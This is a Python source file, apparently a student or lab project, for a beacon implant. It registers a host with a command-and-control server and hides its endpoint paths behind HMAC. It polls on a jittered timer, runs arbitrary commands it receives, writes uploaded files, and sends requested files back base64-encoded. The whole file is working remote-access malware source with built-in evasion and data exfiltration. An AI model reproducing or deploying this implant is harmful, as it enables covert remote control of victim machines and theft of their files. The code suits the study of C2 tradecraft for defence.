#!/usr/bin/python3

# Purpose: Beacon Implant. Periodically calls home to the C2 server to pick up
#          tasks, executes them locally, and posts results back.
# Author: Israel Fernandez
# Date of creation: April 8, 2026

# Deliverables: Upload, Download, Execute — beacon/callback architecture

import base64
import hashlib
import hmac
import os
import platform
import random
import subprocess
import shlex
import time
import uuid

import requests


C2_URL = "https://localhost:9443"

# mTLS: implant presents its client cert, verifies C2 against the shared CA.
_DIR        = os.path.dirname(os.path.abspath(__file__))
_C2         = os.path.join(_DIR, "..", "C2")
CA_CERT     = os.path.join(_C2, "ca.crt")
CLIENT_CERT = (os.path.join(_C2, "c2.crt"), os.path.join(_C2, "c2.key"))

# Shared secret
ENDPOINT_KEY = b"41447568f68e1377515ec0dfa4bd5918a7dcbb5cad1a901ad708a3b7e49e273bf48e850784d094a2b1bb5f460a7a891221f96699c06a0705528afd3c0f2961fd"

# Encrypt Endpoints
def _derive_endpoints(key):
    def encrypt(label):
        return hmac.new(key, label.encode(), hashlib.sha256).hexdigest()[:16]
    return {
        "register": encrypt("register"),
        "tasks":    encrypt("tasks"),
        "results":  encrypt("results"),
    }


ENDPOINT = _derive_endpoints(ENDPOINT_KEY)

BEACON_INTERVAL = 20   # seconds between check-ins (overridable by C2)
JITTER          = 0.2  # +/-20% randomization

IMPLANT_ID = str(uuid.uuid4())

# Connect to C2
def _session():
    s = requests.Session()
    s.verify = CA_CERT
    s.cert   = CLIENT_CERT
    return s


def _sleep():
    jitter = random.uniform(1 - JITTER, 1 + JITTER)
    time.sleep(BEACON_INTERVAL * jitter)



## Handlers

def handle_execute(task):
    try:
        command = shlex.split(task["command"].strip())
        res = subprocess.run(command, capture_output=True, text=True, timeout=120)
        return {"ok": True, "output": res.stdout + res.stderr}
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": "Command timed out (120s)"}
    except OSError as e:
        return {"ok": False, "error": str(e)}


def handle_upload(task):
    try:
        data = base64.b64decode(task["file"])
        with open(task["filename"], "wb") as f:
            f.write(data)
        return {"ok": True, "output": f"Wrote {len(data)} bytes to {task['filename']}"}
    except OSError as e:
        return {"ok": False, "error": str(e)}


def handle_download(task):
    try:
        with open(task["filepath"], "rb") as f:
            data = f.read()
        return {"ok": True, "data": base64.b64encode(data).decode("utf-8"), "filepath": task["filepath"]}
    except OSError as e:
        return {"ok": False, "error": str(e)}


def handle_set_interval(task):
    global BEACON_INTERVAL
    BEACON_INTERVAL = int(task["interval"])
    return {"ok": True, "output": f"Beacon interval set to {BEACON_INTERVAL}s"}


HANDLERS = {
    "execute":      handle_execute,
    "upload":       handle_upload,
    "download":     handle_download,
    "set_interval": handle_set_interval,
}

# Register with the C2 server
def register(session):
    resp = session.post(f"{C2_URL}/{ENDPOINT['register']}", json={
        "id":       IMPLANT_ID,
        "hostname": platform.node(),
        "user":     os.getenv("USER", "unknown"),
        "os":       f"{platform.system()} {platform.release()}",
    }, timeout=10)
    resp.raise_for_status()
    return resp.json()["id"]


def beacon_loop():
    session = _session()

    # Keep trying to register until the C2 is reachable.
    while True:
        try:
            implant_id = register(session)
            break
        except (requests.exceptions.ConnectionError, requests.exceptions.HTTPError):
            _sleep()

    while True:
        try:
            # Poll for a task
            resp = session.get(f"{C2_URL}/{ENDPOINT['tasks']}/{implant_id}", timeout=10)
            resp.raise_for_status()
            body = resp.json()

            task = body.get("task")
            if task:
                task_type = task.get("type", "unknown")
                handler = HANDLERS.get(task_type)
                if handler:
                    result = handler(task)
                else:
                    result = {"ok": False, "error": f"Unknown task type: {task_type}"}

                result["task_id"] = task.get("task_id")
                result["type"] = task_type

                session.post(
                    f"{C2_URL}/{ENDPOINT['results']}/{implant_id}",
                    json=result,
                    timeout=10,
                )

        except requests.exceptions.ConnectionError:
            pass  # C2 is down. Silently retrying next interval
        except requests.exceptions.RequestException:
            pass

        _sleep()


if __name__ == "__main__":
    beacon_loop()
